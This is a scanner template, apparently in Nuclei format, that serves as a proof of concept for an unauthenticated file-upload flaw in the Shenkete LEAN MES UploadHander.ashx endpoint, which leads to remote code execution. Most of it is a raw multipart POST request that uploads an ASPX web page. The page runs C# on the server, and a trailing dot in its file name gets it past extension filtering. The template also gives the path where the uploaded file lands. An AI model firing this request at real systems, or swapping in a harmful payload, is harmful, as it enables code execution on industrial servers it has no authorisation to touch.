id: poc-ris4w8i8dngk6211
info:
  name: 深科特LEAN MES系统UploadHander  存在文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2026
http:
- raw:
  - 'POST /Handler/UploadHander.ashx?Action=ImportResultData HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,

    like Gecko) Chrome/91.0.4472.77 Safari/537.36

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary


    ------WebKitFormBoundary

    Content-Disposition: form-data; name="Filedata"; filename="test123.aspx."


    <%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>

    ------WebKitFormBoundary--

    **上传定位：**

    /UploadFiles/TemporaryFile/test123.aspx'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
